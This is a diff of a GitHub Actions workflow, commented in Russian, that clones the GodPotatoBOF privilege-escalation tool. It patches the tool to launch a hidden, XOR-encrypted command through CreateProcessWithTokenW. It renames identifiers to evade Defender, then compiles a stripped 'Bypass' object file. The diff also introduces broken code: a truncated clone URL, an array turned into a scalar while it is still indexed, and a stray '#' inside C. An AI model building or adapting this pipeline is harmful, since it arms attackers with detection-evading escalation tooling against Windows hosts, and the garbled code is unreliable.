@@ -17,7 +17,7 @@ jobs:
     # 2. Клонируем исходный код GodPotatoBOF во временную папку
     - name: Clone original GodPotatoBOF
       run: |
-        git clone https://github.com/incursi0n/GodPotatoBOF gpp-temp
+        git clone https://github.com gpp-temp
 
     # 3. Настраиваем Python для работы скрипта модификации кода
     - name: Set up Python
@@ -25,13 +25,14 @@ jobs:
       with:
         python-version: '3.11'
 
-    # 4. Модифицируем код: вырезаем BeaconUseToken, шифруем строки, добавляем скрытый CreateProcess
+    # 4. Модифицируем код в главном файле (entry.c)
     - name: Auto-Patch & Obfuscate Source Code
       shell: python
       run: |
         import os
 
-        c_file_path = os.path.join("gpp-temp", "GodPotatoBOF.c")
+        # Открываем главный файл entry.c из репозитория донора
+        c_file_path = os.path.join("gpp-temp", "entry.c")
         
         with open(c_file_path, "r", encoding="utf-8") as f:
             code = f.read()
@@ -54,12 +55,12 @@ jobs:
             0x31, 0x00, 0x00, 0x00
         };
         
-        wchar_t clear_cmd[64];
+        wchar_t clear_cmd;
         for (i = 0; i < 43; i++) {
             ((unsigned char*)clear_cmd)[i*2] = crypt_cmd[i*2] ^ 0x4B;
             ((unsigned char*)clear_cmd)[i*2+1] = 0x00;
         }
-        clear_cmd[43] = L'\\0';
+        clear_cmd = L'\\0';
 
         KERNEL32$RtlSecureZeroMemory(&si, sizeof(si));
         si.cb = sizeof(si);
@@ -67,7 +68,7 @@ jobs:
         si.wShowWindow = 0;      // SW_HIDE (Скрывает окно процесса от Defender)
         KERNEL32$RtlSecureZeroMemory(&pi, sizeof(pi));
 
-        // Вызов системного API создания процесса из токена напрямую
+        # // Вызов системного API создания процесса из токена напрямую
         ADVAPI32$CreateProcessWithTokenW(hToken, 1, NULL, clear_cmd, 0, NULL, NULL, &si, &pi);
         
         if (pi.hProcess) KERNEL32$CloseHandle(pi.hProcess);
@@ -76,30 +77,30 @@ jobs:
 
         if old_token_call in code:
             code = code.replace(old_token_call, new_token_call)
-            print("[+] Успешно пропатчен вызов токена.")
+            print("[+] Успешно пропатчен вызов токена в entry.c.")
         else:
-            print("[-] Критическая ошибка: Сигнатура BeaconUseToken не найдена в исходниках!")
+            print("[-] Критическая ошибка: Сигнатура BeaconUseToken не найдена в entry.c!")
 
-        # Дополнительная маскировка внутренних структур
+        # Дополнительная маскировка внутренних структур проекта
         code = code.replace("GodPotatoContext", "SystemDcomBinding")
         code = code.replace("PotatoTrigger", "TriggerPipeRpc")
         
         with open(c_file_path, "w", encoding="utf-8") as f:
             f.write(code)
 
-    # 5. Устанавливаем стабильный компилятор Zig (0.14.1 идеально подходит под BOF)
+    # 5. Устанавливаем стабильный компилятор Zig
     - name: Setup Zig Compiler
       uses: goto-bus-stop/setup-zig@v2
       with:
         version: 0.14.1 
 
-    # 6. Компилируем обфусцированный BOF
+    # 6. Сборка проекта 
     - name: Compile Obfuscated BOF File
       run: |
         cd gpp-temp
-        # -O ReleaseSmall: включает жесткую оптимизацию размера и обфускацию графа вызовов
-        # -fstrip: полностью удаляет таблицы символов и отладочные имена переменных
-        zig cc -c GodPotatoBOF.c -o ../GodPotatoBOF_Bypass.o -O ReleaseSmall -fstrip -fno-asynchronous-unwind-tables
+        # -I. -Icommon подключает все ваши файлы (beacon.h, bofdefs.h, wmi.h)
+        # -D_WIN32_WINNT=0x0600 сообщает Zig, что мы собираем под современную Windows (от Vista/7 до 10/2022)
+        zig cc -c entry.c -o ../GodPotatoBOF_Bypass.o -I. -Icommon -D_WIN32_WINNT=0x0600 -O ReleaseSmall -fstrip -fno-asynchronous-unwind-tables
         cd ..
 
     # 7. Загружаем готовый .o файл в артефакты репозитория GitHub
